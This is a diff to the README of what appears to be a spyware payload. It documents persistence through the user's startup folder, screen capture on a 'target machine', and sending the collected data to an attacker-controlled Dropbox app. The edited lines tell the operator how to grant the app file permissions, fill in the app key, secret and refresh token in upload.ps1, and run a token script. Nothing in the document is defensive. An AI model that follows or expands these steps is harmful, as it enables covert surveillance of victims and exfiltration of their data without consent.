@@ -16,9 +16,9 @@ the current user's startup folder to restart spyware on every login.
   
 Before you can use the payload you have to make an account with  
 dropbox and create a new dropbox app. All of this can be done  
-through their website. You **must** then take an access token for  
-that app and modify the upload.ps1 uploader script, replacing  
-default access token with the one belonging to your particular app.  
+through their website. You will also have to go to permissions tab  
+for your app and enable any files.metadata and files.content access.  
+You **must** then modify upload.ps1 script to make it work correctly.  
   
 #### screen capture software  
   
@@ -82,11 +82,9 @@ target machine's local storage after the data was sent to dropbox.
 You **must** replace APP_KEY_HERE, APP_SECRET_HERE, REFRESH_TOKEN_HERE  
 strings with correct values inside your upload.ps1 file in order to  
 receive anything. Values of app_key and app_secret are available via  
-dropbox webpage dedicated to your app. To get refresh token you first  
-need to go to permissions tab for your app and enable files.metadata  
-and files.content for both read and write access.  
-After that you will have to run interactive powershell script called  
-get_refresh_token.ps1 and follow the instructions it provides.  
+dropbox webpage dedicated to your app. To get refresh token you will  
+have to run interactive powershell script called get_refresh_token.ps1  
+and follow the instructions it provides.  
   
   
 #### stop the softwares
